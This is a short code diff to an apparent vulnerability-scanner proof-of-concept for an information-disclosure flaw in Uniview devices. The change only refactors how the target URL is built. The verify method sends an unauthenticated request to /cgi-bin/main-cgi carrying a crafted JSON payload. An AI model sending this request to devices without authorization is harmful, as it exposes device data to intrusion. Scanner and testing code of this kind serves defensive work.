@@ -45,7 +45,7 @@ class UniviewDisclosure(POCTemplate):
 
     def verify(self, ip, port=80):
         headers = {'User-Agent': self.config.user_agent}
-        url = f"http://{ip}:{port}" + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
+        url = self.url(ip, port) + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}"'
         try:
             r = self.session.get(url, headers=headers, verify=False, timeout=self.config.timeout)
             if r.status_code == 200 and r.text:
